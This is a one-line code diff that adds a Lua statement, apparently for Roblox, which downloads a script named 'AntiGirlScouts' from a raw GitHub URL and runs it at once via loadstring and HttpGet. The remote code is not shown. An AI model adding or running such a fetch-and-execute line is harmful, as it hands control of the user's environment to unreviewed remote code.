@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/TheHolyThicc/AntiGirlScouts/main/AntiGirlScoutsScript'),true))()
